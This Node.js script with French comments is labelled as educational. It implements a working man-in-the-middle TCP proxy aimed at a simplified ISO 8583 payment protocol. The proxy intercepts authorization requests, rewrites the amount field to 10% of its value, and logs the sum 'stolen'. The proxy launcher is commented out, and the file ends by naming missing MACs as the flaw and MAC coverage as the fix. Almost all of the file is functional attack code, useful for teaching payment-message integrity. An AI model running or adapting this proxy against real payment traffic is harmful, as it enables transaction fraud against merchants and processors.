/**
 * Scénario 1 : Man-in-the-Middle Attack
 * EXPLOIT : Modification du montant dans un message ISO 8583
 * 
 * ⚠️ USAGE PÉDAGOGIQUE UNIQUEMENT
 * 
 * Usage: node mitm-attack.js
 */

const crypto = require('crypto');
const net = require('net');

// Configuration de l'attaque
const CONFIG = {
    listenPort: 8583,           // Port d'écoute (proxy malveillant)
    targetHost: '127.0.0.1',    // Serveur cible
    targetPort: 8584,           // Port du serveur réel
    modifyAmount: true,         // Activer la modification
    targetReduction: 0.1        // Réduire à 10% du montant original
};

/**
 * Parse un message ISO 8583 simplifié
 * Note: Version simplifiée pour démonstration
 */
function parseISO8583(buffer) {
    const message = buffer.toString('utf8');

    // Extraction simplifiée des champs
    // Format: MTI|DE2|DE3|DE4|DE11|...
    const parts = message.split('|');

    return {
        raw: message,
        mti: parts[0],
        pan: parts[1],
        processingCode: parts[2],
        amount: parts[3],         // DE4 - Montant en centimes
        stan: parts[4],
        fields: parts
    };
}

/**
 * Reconstruit le message ISO 8583
 */
function buildISO8583(parsed) {
    return parsed.fields.join('|');
}

/**
 * EXPLOIT: Modifie le montant dans le message
 */
function modifyAmount(parsed, reduction) {
    const originalAmount = parseInt(parsed.amount, 10);
    const newAmount = Math.floor(originalAmount * reduction);

    console.log('\n' + '═'.repeat(60));
    console.log('  💀 ATTAQUE EN COURS - MODIFICATION DU MONTANT');
    console.log('═'.repeat(60));
    console.log(`  PAN: ****${parsed.pan.slice(-4)}`);
    console.log(`  Montant original: ${(originalAmount / 100).toFixed(2)} EUR`);
    console.log(`  Montant modifié:  ${(newAmount / 100).toFixed(2)} EUR`);
    console.log(`  Différence volée: ${((originalAmount - newAmount) / 100).toFixed(2)} EUR`);
    console.log('═'.repeat(60) + '\n');

    // Modifier le champ DE4
    parsed.fields[3] = newAmount.toString().padStart(12, '0');
    parsed.amount = parsed.fields[3];

    return parsed;
}

/**
 * Crée un proxy MitM
 */
function createMitMProxy() {
    const server = net.createServer((clientSocket) => {
        console.log('[MitM] Victime connectée depuis:', clientSocket.remoteAddress);

        // Connexion vers le vrai serveur
        const serverSocket = net.createConnection({
            host: CONFIG.targetHost,
            port: CONFIG.targetPort
        });

        serverSocket.on('connect', () => {
            console.log('[MitM] Connecté au serveur cible');
        });

        // Interception des données du client
        clientSocket.on('data', (data) => {
            console.log('[MitM] Message intercepté du terminal');

            let parsed = parseISO8583(data);

            // Vérifier si c'est une autorisation (MTI 0100)
            if (parsed.mti === '0100' && CONFIG.modifyAmount) {
                parsed = modifyAmount(parsed, CONFIG.targetReduction);
                const modifiedMessage = buildISO8583(parsed);
                serverSocket.write(modifiedMessage);
            } else {
                serverSocket.write(data);
            }
        });

        // Relayer les réponses du serveur
        serverSocket.on('data', (data) => {
            console.log('[MitM] Réponse du serveur relayée');
            clientSocket.write(data);
        });

        // Gestion des erreurs
        serverSocket.on('error', (err) => {
            console.log('[MitM] Erreur serveur:', err.message);
        });

        clientSocket.on('error', (err) => {
            console.log('[MitM] Erreur client:', err.message);
        });
    });

    return server;
}

/**
 * Simulation complète de l'attaque
 */
function simulateAttack() {
    console.log('═'.repeat(60));
    console.log('  🔴 SIMULATION D\'ATTAQUE MAN-IN-THE-MIDDLE');
    console.log('  ⚠️  USAGE STRICTEMENT PÉDAGOGIQUE');
    console.log('═'.repeat(60));

    // Simuler un message ISO 8583 intercepté
    const interceptedMessage = '0100|4111111111111111|000000|000010000|123456|1234';

    console.log('\n📥 Message intercepté:');
    console.log(`   ${interceptedMessage}`);

    const parsed = parseISO8583(Buffer.from(interceptedMessage));

    console.log('\n📋 Champs extraits:');
    console.log(`   MTI: ${parsed.mti} (Authorization Request)`);
    console.log(`   PAN: ****${parsed.pan.slice(-4)}`);
    console.log(`   Montant: ${(parseInt(parsed.amount) / 100).toFixed(2)} EUR`);
    console.log(`   STAN: ${parsed.stan}`);

    // Appliquer la modification
    const modified = modifyAmount({ ...parsed, fields: [...parsed.fields] }, CONFIG.targetReduction);

    console.log('\n📤 Message modifié envoyé au serveur:');
    console.log(`   ${buildISO8583(modified)}`);

    console.log('\n' + '─'.repeat(60));
    console.log('  💡 POURQUOI CETTE ATTAQUE FONCTIONNE:');
    console.log('─'.repeat(60));
    console.log(`
  1. Le message ISO 8583 n'a pas de MAC sur le champ DE4 (montant)
  2. L'attaquant peut modifier n'importe quel champ sans détection
  3. Le serveur fait confiance au message reçu
  
  ✅ SOLUTION: Implémenter un MAC sur tous les champs critiques
`);

    console.log('═'.repeat(60));
    console.log('  Pour lancer un vrai proxy MitM (en environnement contrôlé):');
    console.log('  Décommenter la section startRealProxy() dans le code');
    console.log('═'.repeat(60) + '\n');
}

// Fonction pour démarrer le vrai proxy (désactivé par défaut)
function startRealProxy() {
    const server = createMitMProxy();
    server.listen(CONFIG.listenPort, () => {
        console.log(`[MitM] Proxy malveillant en écoute sur le port ${CONFIG.listenPort}`);
        console.log('[MitM] En attente de victimes...');
    });
}

// Exécution
simulateAttack();

// Pour activer le vrai proxy (DANGEREUX - environnement contrôlé uniquement):
// startRealProxy();

module.exports = { parseISO8583, modifyAmount, buildISO8583 };
